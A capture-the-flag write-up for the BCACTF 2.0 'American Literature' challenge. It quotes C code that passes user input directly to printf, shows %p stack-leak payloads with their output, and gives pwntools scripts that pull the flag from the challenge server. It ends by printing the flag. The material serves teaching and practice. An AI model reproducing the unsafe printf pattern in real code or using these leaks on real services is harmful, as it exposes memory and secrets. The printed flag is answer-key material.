# American Literature

#### Category : binex
#### Points : 150 points (122 solves)
#### Author : Edward Feng

## Challenge
Writing essays is so much fun! Watch me write all these totally meaningful words about other words... Actually, wait. You shouldn't be reading my essays. Shoo!

-   [amer-lit.c](https://objects.bcactf.com/bcactf2/amer-lit/amer-lit.c)
-   [amer-lit](https://objects.bcactf.com/bcactf2/amer-lit/amer-lit)
-   `nc bin.bcactf.com 49157`

## Solution
Browsing through the source code of `amer-lit.c`, we realize that it has a format string vulnerability

#### Vulnerable Code
```cpp
	fgets(essay, sizeof(essay), stdin);
    essay[strcspn(essay, "\n")] = 0;
    length = strlen(essay);

    sleep(1);
    puts("");
    puts("TURNITIN SUBMISSION RECEIVED:");

    printf("╔═");
    for (int i = 0; i < length; ++i) printf("═");
    printf("═╗\n");

    printf("║ ");
    for (int i = 0; i < length; ++i) printf(" ");
    printf(" ║\n");

    printf("║ ");
    for (int i = 0; i < length; ++i) printf(" ");
    printf(" ║\n");

    printf("║ ");
    printf(essay);
```
It takes input from stdin, stores it in the variable `essay` and then prints it using `printf` but without any format specifier.

If in the input, we provide a bunch of `%p`, it will start leaking the stack and we could be able to leak the flag.

#### Leaking the flag
Connecting to the server and sending 30 `%p`, we get the following :
```bash
Let's see it!
%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p

TURNITIN SUBMISSION RECEIVED:
╔═══════════════════════════════════════════════════╗
║                                                   ║
║                                                   ║
║ 0x7fff1f6aeb10(nil)(nil)0x40x40x340000003400x31000003400x31000000310x340000003400x31000000000x562a02cbf2a00x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x25(nil)0x747b6674636163620x6e5f796c6c61746f0x6f6c706d655f746f0x6568745f676e69790x5f666f5f6573755f ║
║                                                   ║
║                                                   ║
╚═══════════════════════════════════════════════════╝
```
We can see that after the last `(nil)`, the hex appear to be ascii. If we convert `0x747b6674636163620` into ascii after reversing it, we get `bcact` which looks like the flag format.

Counting from start, it seems like it is the 20th `%p`. To confirm it we can connect to the server and send `%20$p` and indeed we get the same hex.
```bash
Let's see it!
%20$p

TURNITIN SUBMISSION RECEIVED:
╔═══════╗
║       ║
║       ║
║ 0x747b667463616362 ║
║       ║
║       ║
╚═══════╝
```

#### Getting the flag
So with that much info, we can just make a get_flag.py script which will take the hex, reverse it and concatenate to the flag.

```python
#!/usr/bin/python3
from pwn import *
context.log_level = 'critical'
host = "bin.bcactf.com"
port = 49157
flag = ""
for i in range(20,40):
    s = remote(host, port)
    s.recvuntil(b"Let's see it!")
    s.sendline("%"+str(i)+"$p")
    (s.recvuntil(b'0x'))
    try:
        flag = flag + (bytes.fromhex(s.recv()[:16].decode('ascii')).decode('ascii')[::-1])
    except:
        print(i)
        break
print(flag)

```
Doing this, almost gives us the flag
```bash
$ python3 get_flag.py
32
bcactf{totally_not_employing_the_use_of_generic_words_to_reach_the_required_word_limit_nope_not_
```
We just need to check the `%32$p` manually
```bash
%32$p

TURNITIN SUBMISSION RECEIVED:
╔═══════╗
║       ║
║       ║
║ 0x7ffe007d656d ║
║       ║
║       ║
╚═══════╝
```
Clearly, we just need the last 6 characters of the hex string.
So our [get_flag.py](https://github.com/p1xxxel/ctf-writeups/blob/main/2021/BCACTF%202.0/American%20Literature/get_flag.py) becomes
```python
#!/usr/bin/python3
from pwn import *
context.log_level = 'critical'
host = "bin.bcactf.com"
port = 49157
flag = ""
for i in range(20,33):
    s = remote(host, port)
    s.recvuntil(b"Let's see it!")
    s.sendline("%"+str(i)+"$p")
    (s.recvuntil(b'0x'))
    if (i == 32):
        flag = flag + (bytes.fromhex(s.recv()[6:12].decode('ascii')).decode('ascii')[::-1])
        break
    flag = flag + (bytes.fromhex(s.recv()[:16].decode('ascii')).decode('ascii')[::-1])
print(flag)
```
```bash
$ python3 get_flag.py
bcactf{totally_not_employing_the_use_of_generic_words_to_reach_the_required_word_limit_nope_not_me}
```

flag : `bcactf{totally_not_employing_the_use_of_generic_words_to_reach_the_required_word_limit_nope_not_me}`